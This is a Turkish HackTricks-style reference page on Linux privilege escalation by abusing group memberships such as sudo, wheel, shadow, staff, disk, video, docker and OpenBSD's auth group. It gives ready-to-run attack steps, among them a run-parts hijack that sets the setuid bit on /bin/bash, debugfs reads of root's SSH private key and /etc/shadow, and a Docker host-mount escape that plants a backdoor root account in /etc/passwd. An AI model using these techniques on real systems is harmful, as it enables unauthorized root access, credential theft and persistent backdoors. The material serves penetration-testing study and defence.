# İlgi Çekici Gruplar - Linux Privesc

## Sudo/Admin Grupları

### **PE - Method 1**

**Bazen**, bir sistemin **/etc/sudoers** policy'si (veya bu policy tarafından dahil edilen bir dosya) aşağıdakilere benzer girdiler içerir:<sup>[[3]](#references)</sup>
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Bu, her iki girdiden biriyle eşleşen herhangi bir kullanıcının `sudo` aracılığıyla herhangi bir hedef kullanıcı olarak herhangi bir komutu çalıştırabileceği anlamına gelir (politikanın geri kalanına tabidir).<sup>[[3]](#references)</sup>

Durum buysa, **root olmak için yalnızca şunu çalıştırabilirsiniz**:
```
sudo su
```
### PE - Method 2

Tüm suid binary'lerini bulun ve **Pkexec** binary'sinin olup olmadığını kontrol edin:
```bash
find / -perm -4000 2>/dev/null
```
**pkexec bir SUID binary ise**, yalnızca polkit istenen eyleme yetki verdiğinde bir programı başka bir kullanıcı olarak çalıştırabilir; tek başına SUID biti root erişimini garanti etmez. **sudo** veya **admin** üyeliğinin yeterli olduğunu varsaymak yerine, yüklü policy'yi ve hedef session'ın yetkilendirmesini kontrol edin.<sup>[[4]](#references)[[5]](#references)</sup>

Hâlâ eski Local Authority backend'ini kullanan dağıtımlarda, grup kurallarını şu komutla inceleyin:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
İlgili grup adları ve varsayılanlar dağıtıma göre değişir; bir grup burada yalnızca yerel politika onu adlandırıyorsa kullanışlıdır.<sup>[[5]](#references)</sup>

**root olmak için şunu çalıştırabilirsiniz**:
```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```
**pkexec** çalıştırmayı denerseniz ve şu **hatayı** alırsanız:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
Kayıtlı bir authentication agent bulunmayan bir SSH oturumunda, policy aksi durumda bu işleme izin verecek olsa bile `pkexec` şu hatayla başarısız olabilir; polkit, masaüstü olmayan oturumlar için `pkttyagent`'ı metin tabanlı bir authentication agent olarak belgeler. Kesin davranış sürüme ve dağıtıma bağlıdır; bu nedenle yerel policy'yi ve agent kurulumunu doğrulayın. Etkilenen NixOS sürümleri için bildirilen bir workaround **2 farklı SSH oturumu** kullanır.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

Bazen bir sudoers policy’si şu girdiyi de içerebilir:
```
%wheel	ALL=(ALL:ALL) ALL
```
Bu, girişle eşleşen herhangi bir kullanıcının `sudo` aracılığıyla herhangi bir hedef kullanıcı olarak herhangi bir komutu çalıştırabileceği anlamına gelir (politikanın geri kalanına tabidir).<sup>[[3]](#references)</sup>

Durum buysa, **root olmak için yalnızca şunu çalıştırabilirsiniz**:
```
sudo su
```
## Shadow Grubu

İzinlerin bunu mümkün kıldığı sistemlerde, **shadow** grubundaki kullanıcılar **/etc/shadow** dosyasını **okuyabilir**; hedefteki gerçek mode ve ACL'leri doğrulayın:<sup>[[6]](#references)[[7]](#references)</sup>
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Bu yüzden dosyayı okuyun ve bazı **hash'leri crack etmeyi** deneyin.

Hash'leri incelerken kilit durumuyla ilgili kısa bir ayrıntı:
- `!` veya `*` içeren girdiler genellikle parola girişleri için etkileşimli değildir.
- `!hash`, parolanın kilitlendiği anlamına gelir; kalan karakterler, kilitlenmeden önceki parola alanını temsil eder.
- `*` içeren bir alan geçerli bir `crypt(3)` hash'i değildir ve UNIX-parola ile giriş yapılmasını engeller; parolanın daha önce ayarlanıp ayarlanmadığı sonucunu bundan çıkarmayın.
Doğrudan giriş engellenmiş olsa bile bu bilgi hesap sınıflandırması için kullanışlıdır.<sup>[[6]](#references)</sup>

## Staff Grubu

**staff**: Kullanıcıların root yetkilerine ihtiyaç duymadan sistemde (`/usr/local`) yerel değişiklikler yapmasına izin verir (kullanıcıların `PATH` değişkeninde `/usr/local/bin` içindeki çalıştırılabilir dosyaların bulunduğunu ve aynı ada sahip `/bin` ve `/usr/bin` içindeki çalıştırılabilir dosyaları "override" edebileceklerini unutmayın). Daha çok izleme/güvenlikle ilişkili olan "adm" grubuyla karşılaştırın.<sup>[[2]](#references)[[7]](#references)</sup>

`PATH` içinde `/usr/local/bin` yolunun `/usr/bin` yolundan önce bulunduğu Debian yapılandırmalarında (aşağıdaki örneklerde olduğu gibi), nitelenmemiş bir komut ilk olarak `/usr/local/bin` kopyasına çözümlenir; hedefteki etkin `PATH` değerini doğrulayın.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Ayrıcalıklı bir process, nitelendirilmemiş bir command'ı yazılabilir bir `/usr/local/bin` üzerinden çözümlerse, bu command'ı değiştirmek process'in ayrıcalıklarıyla çalıştırılmasını sağlayabilir; test etmeden önce gerçek path'i ve tetikleyiciyi doğrulayın.

Ubuntu sistemlerinde `pam_motd`, oturum açıldığında executable script'leri root olarak `run-parts --lsbsysinit` aracılığıyla çalıştırır; cron job'ları da `run-parts` kullanabilir, ancak bu durum dağıtıma ve yapılandırmaya özeldir.<sup>[[10]](#references)[[11]](#references)</sup>
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
Yeni bir SSH girişinde `pspy`, bu yolun hedefte gerçekten çağrılıp çağrılmadığını doğrulamaya yardımcı olabilir; root olmadan süreç komut satırlarını gözlemleyebilir.<sup>[[10]](#references)[[12]](#references)</sup>
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Grubu

**disk** grubuna üyelik, blok aygıtlarına ham erişim sağlayabilir ve çoğu zaman **root erişimine yakın** yetkiler verir; Debian bunu çoğunlukla root erişimine eşdeğer olarak tanımlar, ancak hedefte gerçek aygıt izinlerini ve depolama düzenini doğrulayın.<sup>[[7]](#references)</sup>

Yaygın aygıt yolları arasında `/dev/sd*` bulunur, ancak NVMe ve diğer depolama düzenleri farklı adlar kullanır.
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
`debugfs`, ext2/ext3/ext4 dosya sistemleri üzerinde çalışır; yukarıdaki `/root` ve `/etc/shadow` gibi yollar, açılan dosya sistemi içindeki dosyalardır; `dump` komutunun ikinci argümanı ise yerel dosya sistemindeki bir çıktı yoludur.<sup>[[8]](#references)</sup> Örneğin bu işlem, açılan dosya sistemindeki `/tmp/asd1.txt` dosyasını yerel dosya sistemindeki `/tmp/asd2.txt` konumuna çıkarır:
```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
`-w` seçeneği dosya sistemini okuma-yazma modunda açar ve `write` komutu yerel bir dosyayı açılan dosya sistemine kopyalar. Doğrudan yapılan düzenlemeler dosya sistemini bozabileceğinden, bunu bağlı ve aktif bir dosya sisteminde kullanmaktan kaçının; mümkün olduğunda çevrimdışı bir imaj üzerinde çalışın.<sup>[[8]](#references)</sup>
```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```
## Video Grubu

`w` komutunu kullanarak **sistemde kimin oturum açmış olduğunu** bulabilir ve aşağıdakine benzer bir çıktı görebilirsiniz.<sup>[[20]](#references)</sup>
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** girdisi ilk Linux sanal konsolunu tanımlar; tek başına bir kullanıcının fiziksel olarak makinenin başında bulunduğunu kanıtlamaz, özellikle de container'larda veya diğer ortamlarda.<sup>[[21]](#references)</sup>

Okunabilir bir framebuffer device sunan sistemlerde, **video** grubuna üyelik bu device'a erişim sağlayabilir. Linux framebuffer interface, ekran görüntüsü almak üzere kopyalanabilen okunabilir bir memory device olarak `/dev/fb0` yolunu belgeler; `/sys/class/graphics/fb0/virtual_size` yolu yalnızca ilgili fbdev sysfs attribute'unun mevcut olduğu yerlerde kullanılabilir, bu nedenle önce target'ı kontrol edin.<sup>[[7]](#references)[[9]](#references)</sup>
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Yüklü **GIMP** sürümü ham veri içe aktarıcı sunuyorsa **`screen.raw`** dosyasını bu içe aktarıcıyla açın; destek ve denetimler sürüme ve plug-in'e göre değişir.<sup>[[22]](#references)</sup>

![Disk Group - Video Group: Ham görüntüyü açmak için GIMP kullanabilirsiniz; screen.raw dosyasını seçin ve dosya türü olarak Raw image data'yı seçin](<../../../images/image (463).png>)

Görüntü Width ve Height değerlerini framebuffer geometrisiyle eşleşecek şekilde ayarlayın; çıktı okunabilir olana kadar kullanılabilir piksel formatlarını/Image Types seçeneklerini deneyin.<sup>[[9]](#references)</sup>

![Disk Group - Video Group: Ardından Width ve Height değerlerini ekranda kullanılan değerlerle değiştirin ve farklı Image Types seçeneklerini kontrol edin (ekranı daha iyi göstereni seçin)](<../../../images/image (317).png>)

## Root Grubu

**root** grubuna üyelik root'un UID'sini sağlamaz; ancak `root` sahibi olan ve grup tarafından yazılabilir dosyalar, ayrıcalıklı servisler veya kütüphaneler bunları kullandığında yine de ilgi çekici olabilir. Bir dosyayı privilege-escalation yolu olarak değerlendirmeden önce gerçek izinlerini ve nasıl kullanıldığını doğrulayın.

**root üyelerinin değiştirebileceği dosyaları kontrol edin**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Grubu

`docker` grubuna üyelik, standart rootful kurulumlarda root düzeyinde Docker daemon erişimi sağlar. Bind mount'lar varsayılan olarak read-write olduğundan, bu daemon'ı kontrol edebilen bir kullanıcı host'un `/` dizinini bir container'a mount edebilir ve host dosyalarını değiştirebilir; bu da fiilen host üzerinde root erişimi sağlar.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```
Son olarak, önceki önerilerden hiçbirini beğenmiyorsanız veya herhangi bir nedenle çalışmıyorlarsa (docker api firewall?), burada açıklandığı gibi her zaman **privileged bir container çalıştırıp buradan escape etmeyi** deneyebilirsiniz:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Docker socket üzerinde yazma izinleriniz varsa, [**docker socket'i kötüye kullanarak nasıl ayrıcalık yükseltileceğini anlatan bu yazıyı**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)** okuyun.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
./
{{#endref}}

## Adm Group

Genellikle **`adm`** grubunun **üyeleri**, _/var/log/_ içinde bulunan **log** dosyalarını **okuma** izinlerine sahiptir.\
Bu nedenle, bu grubun içindeki bir kullanıcıyı ele geçirdiyseniz kesinlikle **loglara göz atmalısınız**.<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail grupları

Bu grupların hizmete ve dağıtıma özgü anlamları vardır. Debian, `backup` grubunu yetkilendirilmiş backup/restore işlemleri, `lp` grubunu printer daemon'ları ve `mail` grubunu `/var/mail` için belgeler; bu nedenle üyeliği bir ayrıcalık yolu olarak değerlendirmeden önce yerel izinleri kontrol edin.<sup>[[7]](#references)</sup>

Bunlar genellikle doğrudan root vektörlerinden ziyade **credential-discovery** vektörleridir:
- **backup**: Yapılandırmaları, anahtarları, DB dump'larını veya token'ları içeren arşivleri açığa çıkarabilir.
- **operator**: Hassas runtime verilerini leak edebilecek platforma özgü operasyonel erişim sağlayabilir.
- **lp**: Print queue/spool'ları belge içerikleri barındırabilir.
- **mail**: Mail spool'ları password reset link'lerini, OTP'leri ve dahili credential'ları açığa çıkarabilir.

Buradaki üyeliği yüksek değerli bir veri açığa çıkması bulgusu olarak değerlendirin ve password/token reuse üzerinden pivot edin.

## Auth Group

OpenBSD'de S/Key yapılandırıldığında `/etc/skey`, `root:auth` tarafından sahiplenilir ve kayıtlarına erişim için `auth` grubu gerekir; YubiKey kayıtları `/var/db/yubikey` içinde saklanır.<sup>[[16]](#references)[[17]](#references)</sup> S/Key veya YubiKey'in etkin olduğu ve savunmasız olan bir OpenBSD 6.6 yapılandırması, `auth` ayrıcalıklarına sahip yerel kullanıcıların root olmasına izin veriyordu; Qualys ön koşulu ve exploit chain'i belgeler, bağlantısı verilen PoC ise bunu uygular.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [GUI oturumu olmadan pkexec/pkttyagent authentication (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux manual page](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Debian Güvenlik Kılavuzu](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux manual page](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Frame Buffer Device — Linux Kernel dokümantasyonu](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — ayrıcalıksız Linux process snooping](https://github.com/DominicBreuker/pspy)
- [13] [Docker Engine security](https://docs.docker.com/engine/security/)
- [14] [Docker'ı root olmayan bir kullanıcı olarak yönetme](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Container'ları çalıştırma — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD manual pages](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD manual pages](https://man.openbsd.org/login_yubikey.8)
- [18] [OpenBSD'de authentication açıkları — Qualys Security Advisory](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — local exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux manual page](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux allocated devices (4.x+ version)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Image Import and Export — GIMP Documentation](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
